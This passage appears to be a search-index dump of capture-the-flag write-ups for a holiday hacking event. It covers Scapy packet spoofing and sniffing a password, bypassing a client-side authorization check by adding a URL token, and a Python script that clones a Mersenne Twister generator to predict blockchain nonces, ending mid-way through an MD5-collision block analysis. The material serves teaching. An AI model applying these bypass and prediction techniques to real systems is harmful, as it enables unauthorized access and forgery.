\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557 \u2551 ___ ___ ___ ___ ___ _ _ _____ ___ _ ___ _ _____ _____ \u2551 \u2551 | _ \\ _ \\ __/ __| __| \\| |_ _| | _ \\/_\\ / __| |/ / __|_ _| \u2551 \u2551 | _/ / _|\\__ \\ _|| .` | | | | _/ _ \\ (__| ' <| _| | | \u2551 \u2551 |_| |_|_\\___|___/___|_|\\_| |_| |_|/_/ \\_\\___|_|\\_\\___| |_| \u2551 \u2551 ___ \u2551 \u2551 | _ \\_ _ ___ _ __ _ __ ___ _ _ \u2551 \u2551 | _/ '_/ -_) '_ \\ '_ \\/ -_) '_| \u2551 \u2551 |_| |_| \\___| .__/ .__/\\___|_| \u2551 \u2551 |_| |_| \u2551 \u2551 (Packets prepared with scapy) \u2551 \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d Type \"yes\" to begin. Similar to how the Linux Primer helps you to learn some common shell commands, this challenge is meant to help you get acquainted with the inner workings of the Scapy Python library. Knowing how to use Scapy to inspect and create network packets will become important when solving the ARP Shenanigans challenge. Question 1 Welcome to the \"Present Packet Prepper\" interface! The North Pole could use your help preparing present packets for shipment. Start by running the task.submit() function passing in a string argument of 'start'. Type task.help() for help on this question. task . submit ( 'start' ) Question 2 Submit the class object of the scapy module that sends packets at layer 3 of the OSI model. task . submit ( send ) Question 3 Submit the class object of the scapy module that sniffs network packets and returns those packets in a list. task . submit ( sniff ) Question 4 Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named pkt : pkt = sr1(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sniff(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sendp(IP(dst=\"127.0.0.1\")/TCP(dport=20)) task . submit ( 1 ) Question 5 Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets. task . submit ( rdpcap ) Question 6 The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS : UDP_PACKETS.print() UDP_PACKETS.show() UDP_PACKETS.list() task . submit ( 2 ) Question 7 Submit only the first packet found in UDP_PACKETS . task . submit ( UDP_PACKETS [ 0 ]) Question 8 Submit only the entire TCP layer of the second packet in TCP_PACKETS . task . submit ( TCP_PACKETS [ 1 ][ TCP ]) Question 9 Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet. UDP_PACKETS [ 0 ][ IP ] . src = '127.0.0.1' task . submit ( UDP_PACKETS [ 0 ]) Question 10 Submit the password task.submit('elf_password') of the user alabaster as found in the packet list TCP_PACKETS . TCP_PACKETS . show () for x in range ( 3 , 7 ): print ( TCP_PACKETS [ x ][ Raw ] . load ) task . submit ( 'echo' ) Question 11 The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list. task . submit ( ICMP_PACKETS [ 1 ][ ICMP ] . chksum ) Question 12 Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named pkt : pkt = Ether(src='127.0.0.1')/ICMP(type=\"echo-request\") pkt = IP(src='127.0.0.1')/ICMP(type=\"echo-reply\") pkt = IP(dst='127.0.0.1')/ICMP(type=\"echo-request\") task . submit ( 3 ) Question 13 Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified). packet = Ether () / IP ( dst = '127.127.127.127' ) / UDP ( dport = 5000 ) task . submit ( packet ) Question 14 Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of \"elveslove.santa\". (all other packet attributes can be unspecified). packet = Ether () / IP ( dst = '127.2.3.4' ) / UDP ( dport = 53 ) / DNS ( qd = DNSQR ( qname = \"elveslove.santa\" )) task . submit ( packet ) Question 15 The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task. submit(ARP_PACKETS) for inspection. ARP_PACKETS [ 1 ] . show () ARP_PACKETS [ 1 ][ ARP ] . op = 2 ARP_PACKETS [ 1 ][ ARP ] . hwsrc = '00:13:46:0b:22:ba' ARP_PACKETS [ 1 ][ ARP ] . hwdst = '00:16:ce:6e:8b:24' task . submit ( ARP_PACKETS ) After answering all questions correctly you'll be a certified Scapy Present Packet Prepper operator!","title":"Solution"},{"location":"hints/h9/#response","text":"Alabaster Snowball Great job! Thanks! Those skills might be useful to you later on! I've been trying those skills out myself on this other terminal. I'm pretty sure I can use tcpdump to sniff some packets. Then I'm going to try a machine-in-the-middle attack. Next, I'll spoof a DNS response to point the host to my terminal. Then I want to respond to its HTTP request with something I'll cook up. I'm almost there, but I can't quite get it. I could use some help! For privacy reasons though, I can't let you access this other terminal. I do plan to ask Santa for a hand with it next time he's nearby, though.","title":"Response"},{"location":"objectives/o1/","text":"Uncover Santa's Gift List \u2693\ufe0e Difficulty : Direct link : billboard.png Terminal hint : - Objective \u2693\ufe0e Request There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice. Jingle Ringford Oh, and before you head off up the mountain, you might want to try to figure out what's written on that advertising bilboard. Have you managed to read the gift list at the center? It can be hard when things are twirly. There are tools that can help! It also helps to select the correct twirly area. Hints \u2693\ufe0e Twirl Area Make sure you Lasso the correct twirly area. Image Edit Tool There are tools out there that could help Filter the Distortion that is this Twirl. Solution \u2693\ufe0e Depending on the image edit, some manipulations are reversible. Download and open the billboard image image in the online image editing tool Jingle Ringford recommends. Select the area around the scrambled letter and apply a Twirl filter with a positive angle value using Filter > Distort > Twirl to unscramble the selected image area. Name Gift Ed Two Front Teeth ?an OU Jersey Jeremy Blanket Brian ? Josh Wright Proxmark Clay Darth Vader Suit Tad Holiday Lights Phil Stuffed Pikachu Jerry Trip to North Pole Answer Proxmark","title":"Uncover Santa's Gift List"},{"location":"objectives/o1/#uncover-santas-gift-list","text":"Difficulty : Direct link : billboard.png Terminal hint : -","title":"Uncover Santa's Gift List"},{"location":"objectives/o1/#objective","text":"Request There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice. Jingle Ringford Oh, and before you head off up the mountain, you might want to try to figure out what's written on that advertising bilboard. Have you managed to read the gift list at the center? It can be hard when things are twirly. There are tools that can help! It also helps to select the correct twirly area.","title":"Objective"},{"location":"objectives/o1/#hints","text":"Twirl Area Make sure you Lasso the correct twirly area. Image Edit Tool There are tools out there that could help Filter the Distortion that is this Twirl.","title":"Hints"},{"location":"objectives/o1/#solution","text":"Depending on the image edit, some manipulations are reversible. Download and open the billboard image image in the online image editing tool Jingle Ringford recommends. Select the area around the scrambled letter and apply a Twirl filter with a positive angle value using Filter > Distort > Twirl to unscramble the selected image area. Name Gift Ed Two Front Teeth ?an OU Jersey Jeremy Blanket Brian ? Josh Wright Proxmark Clay Darth Vader Suit Tad Holiday Lights Phil Stuffed Pikachu Jerry Trip to North Pole Answer Proxmark","title":"Solution"},{"location":"objectives/o10/","text":"Defeat Fingerprint Sensor \u2693\ufe0e Difficulty : Direct link : elevator website Terminal hint : - Objective \u2693\ufe0e Request Bypass the Santavator fingerprint sensor - without Santa's fingerprint! What is the first thing Tinsel Upatree says when he sees you in Santa's office? Solution \u2693\ufe0e Updated objective The objective changed slightly during the course of the event. Solving this challenge initially required submitting the answer to the question What is the first thing Tinsel Upatree says when you enter Santa's office? . Entering Santa's office as a regular player now also marks the objective completed. Starting point The amount of effort required to bypass the fingerprint sensor and sneak into Santa's office depends on how the Santavator was activated. If the Super Santavator Sparkle Stream has been bypassed then all Santavator buttons will be powered on and all that's left is getting past the fingerprint sensor. Similarly, if enough items have been picked up to cobble together a working Super Santavator Sparkle Stream configuration that sends enough of the stream in the right color to each of the receivers, then all buttons will be powered on and the fingerprint sensor is the last remaining hurdle. An alternative to picking up items around the castle is to manually add them to the Santavator, but because that solution requires similar steps used to bypass the fingerprint sensor itself we'll focus on the fingerprint sensor in this write-up and note where things are applicable to the items as well. Open up the Santavator app.js file and look at handleBtn4() . This function handles the button press events for the button to Santa's Office and the fingerprint scanner. There's 2 requirements that need to be met. First, the 3rd floor button needs to be powered on (i.e. have a powered CSS class) and hasToken('besanta') needs to return true (line 6). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 const handleBtn4 = () => { const cover = document . querySelector ( '.print-cover' ); cover . classList . add ( 'open' ); cover . addEventListener ( 'click' , () => { if ( btn4 . classList . contains ( 'powered' ) && hasToken ( 'besanta' )) { $ . ajax ({ type : 'POST' , url : POST_URL , dataType : 'json' , contentType : 'application/json' , data : JSON . stringify ({ targetFloor : '3' , id : getParams . id , }), success : ( res , status ) => { if ( res . hash ) { __POST_RESULTS__ ({ resourceId : getParams . id || '1111' , hash : res . hash , action : 'goToFloor-3' , }); } } }); } else { __SEND_MSG__ ({ type : 'sfx' , filename : 'error.mp3' , }); } }); }; The hasToken() function is not only used with the besanta value but is also called throughout the code with values that reference the items you can pick up around the castle (e.g., marble , portals , ball , yellowlight ). The function definition can be found near the top of app.js and checks if a parsed tokens URL parameter (line 2) contains a particular token name (line 6). 1 2 3 4 5 6 const getParams = __PARSE_URL_VARS__ (); let tokens = ( getParams . tokens || '' ). split ( ',' ); document . body . classList = tokens . join ( ' ' ); // document.body.classList = [ ...tokens, 'open' ].join(' '); const hasToken = name => tokens . indexOf ( name ) !== - 1 ; By manually adding besanta to the challenge tokens URL parameter we can now force hasToken('besanta') to return true . If the button to Santa's Office is powered on as well this will ensure that both handleBtn4() requirements are met and the fingerprint scanner can then be bypassed by clicking on the scanner image. Manually adding items The same technique can be used for adding items to the circuitboard by updating the tokens URL parameter with any of the following values: candycane , marble , marble2 , nut , nut2 , redlight , yellowlight , greenlight , portals , ball . The items can then be used to help split and redirect the stream to the different receivers and build a working configuration . elevator-key and workshop-button can also be specified to add the panel key and missing button, respectively. The quickest way to power on any of the panel buttons however is by bypassing the Super Santavator Sparkle Stream. Head to Santa's Office on the 3rd floor and talk to Tinsel Upatree. Tinsel Upatree GOSHGOLLY How did you get in here?? I mean, hey, I'm impressed you made it in here, but you've got to leave! Breaking into Santa's office might mean immediate membership on the wrong side of the Naughty/Nice List. Answer GOSHGOLLY","title":"Defeat Fingerprint Sensor"},{"location":"objectives/o10/#defeat-fingerprint-sensor","text":"Difficulty : Direct link : elevator website Terminal hint : -","title":"Defeat Fingerprint Sensor"},{"location":"objectives/o10/#objective","text":"Request Bypass the Santavator fingerprint sensor - without Santa's fingerprint! What is the first thing Tinsel Upatree says when he sees you in Santa's office?","title":"Objective"},{"location":"objectives/o10/#solution","text":"Updated objective The objective changed slightly during the course of the event. Solving this challenge initially required submitting the answer to the question What is the first thing Tinsel Upatree says when you enter Santa's office? . Entering Santa's office as a regular player now also marks the objective completed. Starting point The amount of effort required to bypass the fingerprint sensor and sneak into Santa's office depends on how the Santavator was activated. If the Super Santavator Sparkle Stream has been bypassed then all Santavator buttons will be powered on and all that's left is getting past the fingerprint sensor. Similarly, if enough items have been picked up to cobble together a working Super Santavator Sparkle Stream configuration that sends enough of the stream in the right color to each of the receivers, then all buttons will be powered on and the fingerprint sensor is the last remaining hurdle. An alternative to picking up items around the castle is to manually add them to the Santavator, but because that solution requires similar steps used to bypass the fingerprint sensor itself we'll focus on the fingerprint sensor in this write-up and note where things are applicable to the items as well. Open up the Santavator app.js file and look at handleBtn4() . This function handles the button press events for the button to Santa's Office and the fingerprint scanner. There's 2 requirements that need to be met. First, the 3rd floor button needs to be powered on (i.e. have a powered CSS class) and hasToken('besanta') needs to return true (line 6). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 const handleBtn4 = () => { const cover = document . querySelector ( '.print-cover' ); cover . classList . add ( 'open' ); cover . addEventListener ( 'click' , () => { if ( btn4 . classList . contains ( 'powered' ) && hasToken ( 'besanta' )) { $ . ajax ({ type : 'POST' , url : POST_URL , dataType : 'json' , contentType : 'application/json' , data : JSON . stringify ({ targetFloor : '3' , id : getParams . id , }), success : ( res , status ) => { if ( res . hash ) { __POST_RESULTS__ ({ resourceId : getParams . id || '1111' , hash : res . hash , action : 'goToFloor-3' , }); } } }); } else { __SEND_MSG__ ({ type : 'sfx' , filename : 'error.mp3' , }); } }); }; The hasToken() function is not only used with the besanta value but is also called throughout the code with values that reference the items you can pick up around the castle (e.g., marble , portals , ball , yellowlight ). The function definition can be found near the top of app.js and checks if a parsed tokens URL parameter (line 2) contains a particular token name (line 6). 1 2 3 4 5 6 const getParams = __PARSE_URL_VARS__ (); let tokens = ( getParams . tokens || '' ). split ( ',' ); document . body . classList = tokens . join ( ' ' ); // document.body.classList = [ ...tokens, 'open' ].join(' '); const hasToken = name => tokens . indexOf ( name ) !== - 1 ; By manually adding besanta to the challenge tokens URL parameter we can now force hasToken('besanta') to return true . If the button to Santa's Office is powered on as well this will ensure that both handleBtn4() requirements are met and the fingerprint scanner can then be bypassed by clicking on the scanner image. Manually adding items The same technique can be used for adding items to the circuitboard by updating the tokens URL parameter with any of the following values: candycane , marble , marble2 , nut , nut2 , redlight , yellowlight , greenlight , portals , ball . The items can then be used to help split and redirect the stream to the different receivers and build a working configuration . elevator-key and workshop-button can also be specified to add the panel key and missing button, respectively. The quickest way to power on any of the panel buttons however is by bypassing the Super Santavator Sparkle Stream. Head to Santa's Office on the 3rd floor and talk to Tinsel Upatree. Tinsel Upatree GOSHGOLLY How did you get in here?? I mean, hey, I'm impressed you made it in here, but you've got to leave! Breaking into Santa's office might mean immediate membership on the wrong side of the Naughty/Nice List. Answer GOSHGOLLY","title":"Solution"},{"location":"objectives/o11a/","text":"Naughty/Nice List with Blockchain Investigation Part 1 \u2693\ufe0e Difficulty : Direct link : blockchain.dat Terminal hint : Snowball Fight Objective \u2693\ufe0e Request Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools . (Enter just the 16-character hex value of the nonce) Tinsel Upatree Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk. You can get some tools to help you here . Tangle Coalbox, in the Speaker UNPreparedness room. has been talking with attendees about the issue. Hints \u2693\ufe0e MD5 Hash Collisions If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. Solution \u2693\ufe0e Predicting the nonce for block 130000 requires recreating or cloning the state of the Mersenne Twister pseudo random number generator (PRNG) that was originally used to generate the nonce values in the blockchain. To do this we require a few things. As Santa, grab the blockchain.dat file from the desk in your office. We also need the naughty_nice.py script from the official Naughty/Nice Blockchain education pack so we can load the blockchain.dat file and extract the nonces. Finally, grab a copy of Tom Liston's mt19937.py script that will allow us to clone a Mersenne Twister PRNG. Two libraries, same outcome Tom Liston's mt19937.py script is an implementation of a 32-bit MT19937 PRNG. The nonces in the blockchain.dat file however are 64-bit integers. A little bit of extra work is required to first convert the 64-bit nonces to 32-bit integers. An alternative 32-bit Mersenne Twister Python implementation which already supports multiples of 32-bit integer sizes is Kimiyuki Onaka's mersenne-twister-predictor library. The final generate_nonce.py script solves the challenge using both libraries to help explain how a 32-bit Mersenne Twister PRNG state can be recreated using 64-bit integers and how we can then use the PRNG to predict the next 64-bit values. Open the blockchain.dat file (line 3) and read all the nonce values into a list (lines 12-13). 1 2 3 4 5 6 7 8 9 10 11 12 13 if __name__ == '__main__' : # load the blockchain file c2 = Chain ( load = True , filename = 'blockchain.dat' ) # print some blockchain stats print ( f 'The chain contains { len ( c2 . blocks ) } blocks' ) print ( f 'First block has index { c2 . blocks [ 0 ] . index } ' ) print ( f 'Last block has index { c2 . blocks [ - 1 ] . index } ' ) # get the nonce values from the blocks nonce_list = [] for block in c2 . blocks : nonce_list . append ( block . nonce ) Create two MT19937 PRNGs. One using Kimiyuki Onaka's library ( kmyk ) and one based on Tom's sample code ( tliston ). 1 2 3 4 5 6 7 # create a kmyk MT19937 PRNG predictor # https://github.com/kmyk/mersenne-twister-predictor kmyk = MT19937Predictor () # create a Tom Liston MT19937 PRNG predictor # https://github.com/tliston/mt19937 tliston = mt19937 ( 0 ) The internal state of a 32-bit Mersenne Twister is tracked using an array of 624 32-bit integer values. Because we can split our 64-bit nonce values into two 32-bit parts we need at least 312 64-bit nonces to recreate the internal state of the PRNG. For kmyk this 64-bit to 32-bit conversion is handled behind the scenes and we just need to specify the bit size as a parameter (line 3). For the tliston implementation we need to split the 64-bit nonce into two 32-bit integers ourselves before sending each part through the PRNG's untemper() function. The first 32-bit integer is simply the lower 32 bits of the 64-bit nonce (line 9). The second 32-bit integer is created by right-shifting the upper half of the nonce by 32 bits (line 11). 1 2 3 4 5 6 7 8 9 10 11 12 # use all but the final 5 nonces for kmyk for nonce in nonce_list [: - 5 ]: kmyk . setrandbits ( nonce , 64 ) # use 312 64-bit nonces, excluding the final 5, for tliston idx = 0 for nonce in nonce_list [ - 317 : - 5 ]: # least significant 32-bit tliston . MT [ idx ] = untemper ( nonce & 0xFFFFFFFF ) # most significant 32-bit tliston . MT [ idx + 1 ] = untemper (( nonce >> 32 ) & 0xFFFFFFFF ) idx += 2 We don't use the final 5 nonce values to clone the PRNG because we need something to compare our predicted values against. Generating the next 5 numbers using kmyk (line 8) and tliston (line 10) should match the last 5 blockchain.dat nonces. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # generate the next 5 values and compare them to the final 5 in the blockchain print ( ' \\n Verifying correctness using the last 5 blockchain nonces:' ) print ( ' \\n Index kmyk tliston Blockchain Check' ) for i in range ( 5 ): # blockchain verification value nonce_next = nonce_list [ - 5 + i ] # next kmyk value kmyk_next = kmyk . getrandbits ( 64 ) # next tliston value tliston_next = extract_number_64 ( tliston ) # comparison table print ( ' %i %16.16x %16.16x %16.16x %r ' % ( c2 . blocks [ - 5 + i ] . index , kmyk_next , tliston_next , nonce_next , ( kmyk_next == tliston_next == nonce_next ) )) assert ( kmyk_next == tliston_next == nonce_next ) Generating 64-bit random numbers To use a 32-bit Mersenne Twister PRNG to generate a 64-bit integer, generate two 32-bit random numbers and combine them together into a 64-bit value by using the reverse process used for splitting a 64-bit number into two 32-bit values. This is exactly what the extract_number_64() function does. 1 2 3 4 5 6 7 8 9 def extract_number_64 ( tliston ): # grab 2 32-bit random values next1 = tliston . extract_number () next2 = tliston . extract_number () # transform them into a 64-bit value bytes = bytearray () bytes += next2 . to_bytes ( 4 , byteorder = 'big' ) bytes += next1 . to_bytes ( 4 , byteorder = 'big' ) return int . from_bytes ( bytes , byteorder = 'big' ) Run the script to verify that everything is working as intended. The 5 generated values from both cloned PRNGs match up with the 5 final nonce values from the blockchain.dat file. The final part of the script uses the kmyk (line 6) and tliston (line 8) PRNGs to predict the next 4 nonces up to block 130000. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # predict the next 4 random values print ( ' \\n Generating the next values:' ) print ( ' \\n Index kmyk tliston' ) for i in range ( 4 ): # kmyk answer kmyk_next = kmyk . getrandbits ( 64 ) # tliston answer tliston_next = extract_number_64 ( tliston ) # prediction table print ( ' %i %16.16x %16.16x ' % ( c2 . blocks [ - 1 ] . index + i + 1 , kmyk_next , tliston_next , )) Answer 57066318f32f729d","title":"Naughty/Nice List Pt.1"},{"location":"objectives/o11a/#naughtynice-list-with-blockchain-investigation-part-1","text":"Difficulty : Direct link : blockchain.dat Terminal hint : Snowball Fight","title":"Naughty/Nice List with Blockchain Investigation Part 1"},{"location":"objectives/o11a/#objective","text":"Request Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools . (Enter just the 16-character hex value of the nonce) Tinsel Upatree Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk. You can get some tools to help you here . Tangle Coalbox, in the Speaker UNPreparedness room. has been talking with attendees about the issue.","title":"Objective"},{"location":"objectives/o11a/#hints","text":"MD5 Hash Collisions If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time.","title":"Hints"},{"location":"objectives/o11a/#solution","text":"Predicting the nonce for block 130000 requires recreating or cloning the state of the Mersenne Twister pseudo random number generator (PRNG) that was originally used to generate the nonce values in the blockchain. To do this we require a few things. As Santa, grab the blockchain.dat file from the desk in your office. We also need the naughty_nice.py script from the official Naughty/Nice Blockchain education pack so we can load the blockchain.dat file and extract the nonces. Finally, grab a copy of Tom Liston's mt19937.py script that will allow us to clone a Mersenne Twister PRNG. Two libraries, same outcome Tom Liston's mt19937.py script is an implementation of a 32-bit MT19937 PRNG. The nonces in the blockchain.dat file however are 64-bit integers. A little bit of extra work is required to first convert the 64-bit nonces to 32-bit integers. An alternative 32-bit Mersenne Twister Python implementation which already supports multiples of 32-bit integer sizes is Kimiyuki Onaka's mersenne-twister-predictor library. The final generate_nonce.py script solves the challenge using both libraries to help explain how a 32-bit Mersenne Twister PRNG state can be recreated using 64-bit integers and how we can then use the PRNG to predict the next 64-bit values. Open the blockchain.dat file (line 3) and read all the nonce values into a list (lines 12-13). 1 2 3 4 5 6 7 8 9 10 11 12 13 if __name__ == '__main__' : # load the blockchain file c2 = Chain ( load = True , filename = 'blockchain.dat' ) # print some blockchain stats print ( f 'The chain contains { len ( c2 . blocks ) } blocks' ) print ( f 'First block has index { c2 . blocks [ 0 ] . index } ' ) print ( f 'Last block has index { c2 . blocks [ - 1 ] . index } ' ) # get the nonce values from the blocks nonce_list = [] for block in c2 . blocks : nonce_list . append ( block . nonce ) Create two MT19937 PRNGs. One using Kimiyuki Onaka's library ( kmyk ) and one based on Tom's sample code ( tliston ). 1 2 3 4 5 6 7 # create a kmyk MT19937 PRNG predictor # https://github.com/kmyk/mersenne-twister-predictor kmyk = MT19937Predictor () # create a Tom Liston MT19937 PRNG predictor # https://github.com/tliston/mt19937 tliston = mt19937 ( 0 ) The internal state of a 32-bit Mersenne Twister is tracked using an array of 624 32-bit integer values. Because we can split our 64-bit nonce values into two 32-bit parts we need at least 312 64-bit nonces to recreate the internal state of the PRNG. For kmyk this 64-bit to 32-bit conversion is handled behind the scenes and we just need to specify the bit size as a parameter (line 3). For the tliston implementation we need to split the 64-bit nonce into two 32-bit integers ourselves before sending each part through the PRNG's untemper() function. The first 32-bit integer is simply the lower 32 bits of the 64-bit nonce (line 9). The second 32-bit integer is created by right-shifting the upper half of the nonce by 32 bits (line 11). 1 2 3 4 5 6 7 8 9 10 11 12 # use all but the final 5 nonces for kmyk for nonce in nonce_list [: - 5 ]: kmyk . setrandbits ( nonce , 64 ) # use 312 64-bit nonces, excluding the final 5, for tliston idx = 0 for nonce in nonce_list [ - 317 : - 5 ]: # least significant 32-bit tliston . MT [ idx ] = untemper ( nonce & 0xFFFFFFFF ) # most significant 32-bit tliston . MT [ idx + 1 ] = untemper (( nonce >> 32 ) & 0xFFFFFFFF ) idx += 2 We don't use the final 5 nonce values to clone the PRNG because we need something to compare our predicted values against. Generating the next 5 numbers using kmyk (line 8) and tliston (line 10) should match the last 5 blockchain.dat nonces. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # generate the next 5 values and compare them to the final 5 in the blockchain print ( ' \\n Verifying correctness using the last 5 blockchain nonces:' ) print ( ' \\n Index kmyk tliston Blockchain Check' ) for i in range ( 5 ): # blockchain verification value nonce_next = nonce_list [ - 5 + i ] # next kmyk value kmyk_next = kmyk . getrandbits ( 64 ) # next tliston value tliston_next = extract_number_64 ( tliston ) # comparison table print ( ' %i %16.16x %16.16x %16.16x %r ' % ( c2 . blocks [ - 5 + i ] . index , kmyk_next , tliston_next , nonce_next , ( kmyk_next == tliston_next == nonce_next ) )) assert ( kmyk_next == tliston_next == nonce_next ) Generating 64-bit random numbers To use a 32-bit Mersenne Twister PRNG to generate a 64-bit integer, generate two 32-bit random numbers and combine them together into a 64-bit value by using the reverse process used for splitting a 64-bit number into two 32-bit values. This is exactly what the extract_number_64() function does. 1 2 3 4 5 6 7 8 9 def extract_number_64 ( tliston ): # grab 2 32-bit random values next1 = tliston . extract_number () next2 = tliston . extract_number () # transform them into a 64-bit value bytes = bytearray () bytes += next2 . to_bytes ( 4 , byteorder = 'big' ) bytes += next1 . to_bytes ( 4 , byteorder = 'big' ) return int . from_bytes ( bytes , byteorder = 'big' ) Run the script to verify that everything is working as intended. The 5 generated values from both cloned PRNGs match up with the 5 final nonce values from the blockchain.dat file. The final part of the script uses the kmyk (line 6) and tliston (line 8) PRNGs to predict the next 4 nonces up to block 130000. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # predict the next 4 random values print ( ' \\n Generating the next values:' ) print ( ' \\n Index kmyk tliston' ) for i in range ( 4 ): # kmyk answer kmyk_next = kmyk . getrandbits ( 64 ) # tliston answer tliston_next = extract_number_64 ( tliston ) # prediction table print ( ' %i %16.16x %16.16x ' % ( c2 . blocks [ - 1 ] . index + i + 1 , kmyk_next , tliston_next , )) Answer 57066318f32f729d","title":"Solution"},{"location":"objectives/o11b/","text":"Naughty/Nice List with Blockchain Investigation Part 2 \u2693\ufe0e Difficulty : Direct link : blockchain.dat Terminal hint : Snowball Fight Objective \u2693\ufe0e Request The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block? Hints \u2693\ufe0e Imposter Block Event Shinny Upatree swears that he doesn't remember writing the contents of the document found in that block. Maybe looking closely at the documents, you might find something interesting. Unique Hash Collision If Jack was somehow able to change the contents of the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Blockchain ... Chaining A blockchain works by \"chaining\" blocks together - each new block includes a hash of the previous block. That previous hash value is included in the data that is hashed - and that hash value will be in the next block. So there's no way that Jack could change an existing block without it messing up the chain... Minimal Changes Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. Block Investigation The idea that Jack could somehow change the data in a block without invalidating the whole chain just collides with the concept of hashes and blockchains. While there's no way it could happen, maybe if you look at the block that seems like it got changed, it might help. Blockchain Talk Qwerty Petabyte is giving a talk about blockchain tomfoolery! Solution \u2693\ufe0e Understanding the Naughty/Nice Blockchain format Professor Qwerty Petabyte explains the architecture and technical background of the Naughty/Nice Blockchain in great detail but two key points to remember are (1) that each block in the blockchain contains the MD5 hash of the previous signed block data (i.e., block data + signature) and (2) that the signature is created based on the MD5 of the block data. Dumping the block Before determining what exactly happened to Jack's altered block we first need to find it and save the signed block data to a file. Grab the blockchain.dat file from the desk in Santa's office and the naughty_nice.py script from the official Naughty/Nice Blockchain education pack . We need the latter to read the blockchain.dat file and export block data to a file. Use dump_blocks.py to load the blockchain.dat file, find the block with the matching SHA256 value, print the block details, and save the signed block data and any attached documents to 129459.dat , 129459.pdf , and 129459.bin . 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Chain Index: 129459 Nonce: a9447e5771c704f4 PID: 0000000000012fd1 RID: 000000000000020f Document Count: 2 Score: ffffffff (4294967295) Sign: 1 (Nice) Data item: 1 Data Type: ff (Binary blob) 